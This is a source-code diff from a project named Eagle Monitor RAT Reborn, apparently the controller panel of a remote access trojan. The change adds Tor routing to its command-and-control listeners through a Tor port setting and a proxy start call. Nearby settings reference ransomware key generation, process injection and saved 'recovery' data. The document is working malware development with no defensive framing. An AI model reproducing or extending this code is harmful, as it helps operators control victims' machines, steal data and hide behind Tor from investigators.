@@ -29,7 +29,7 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
 
         internal static readonly string GPath = Application.StartupPath;
         internal static readonly string StubPath = GPath + "\\Stubs\\Client";
-        internal static byte[] NotificationSound = File.ReadAllBytes(GPath + "\\Notification\\notification.wav");
+        ///internal static byte[] NotificationSound = File.ReadAllBytes(GPath + "\\Notification\\notification.wav");
 
         internal static string SplitPath(string P)
         {
@@ -49,7 +49,9 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
                 {
                     Program.mainForm.portListView.Items.Add(p.ToString());
                 }
-
+                foreach (ListViewItem tp in Program.mainForm.portListView.Items)
+                    if (tp.Text == Convert.ToString(Program.settings.torPort))
+                        tp.ForeColor = Color.Orange;
                 foreach (Tuple<string, string> host in Program.settings.hosts)
                 {
                     int rowId = Program.mainForm.hostsDataGridView.Rows.Add();
@@ -57,7 +59,7 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
                     row.Cells["Column22"].Value = host.Item1;
                     row.Cells["Column23"].Value = host.Item2;
                 }
-
+                Program.mainForm.torRouteCheckBox.Checked = Program.settings.torRouting;
                 Program.mainForm.notificationSoundGuna2CheckBox.Checked = Program.settings.notificationSound;
                 Program.mainForm.notificationIconGuna2CheckBox.Checked = Program.settings.notificationIcon;
                 Program.mainForm.autoSaveRecoveryGuna2CheckBox.Checked = Program.settings.autoSaveRecovery;
@@ -126,7 +128,7 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
             Program.settings.autoGenerateRSAKey = Program.mainForm.ransomKeyGuna2CheckBox.Checked;
             Program.settings.notificationIcon = Program.mainForm.notificationIconGuna2CheckBox.Checked;
             Program.settings.hosts = new List<Tuple<string, string>>();
-
+            Program.settings.torRouting = Program.mainForm.torRouteCheckBox.Checked;
             foreach (DataGridViewRow host in Program.mainForm.hostsDataGridView.Rows)
             {
                 // hostsList += $"\"{host.Cells[0].Value}:{host.Cells[1].Value}\",";
@@ -136,6 +138,8 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
             foreach (ListViewItem I in Program.mainForm.portListView.Items)
             {
                 Program.settings.ports.Add(int.Parse(I.Text));
+                if (I.ForeColor == Color.Orange)
+                    Program.settings.torPort = int.Parse(I.Text);
             }
 
             switch (Program.mainForm.processInjectionGuna2ComboBox.SelectedIndex) 
@@ -206,6 +210,8 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
                     s.Listen(p);
                 }).Start();
             }
+            if (Program.settings.torRouting)
+                Router.StartProxy();
         }
 
         internal static void ToCSV(DataGridView dataGridView, string filePath)
